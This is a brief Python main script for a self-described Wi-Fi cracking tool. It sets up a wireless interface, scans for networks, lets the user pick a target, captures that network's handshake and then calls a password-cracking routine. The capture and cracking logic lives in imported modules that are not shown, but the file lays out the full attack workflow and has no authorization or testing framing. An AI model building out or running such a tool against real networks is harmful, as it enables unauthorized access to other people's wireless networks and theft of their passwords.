from wifi.interface import setup_interface
from wifi.scanner import scan_networks, select_network
from wifi.handshake import capture_handshake
from wifi.cracker import crack_password

def main():
    print("[+] Starting Wi-Fi Cracking Tool...")

    # Set up the interface
    interface = setup_interface()
    if not interface:
        print("[-] Failed to set up the interface. Exiting.")
        return

    # Scan for networks
    networks = scan_networks(interface)
    if not networks:
        print("[-] No networks found. Exiting.")
        return

    # Select the target network
    target = select_network(networks)
    print(f"[+] Target selected: {target[0]} ({target[1]})")

    # Capture handshake
    capture_handshake(interface, target)

    # Crack the password
    crack_password(target)

if __name__ == "__main__":
    main()
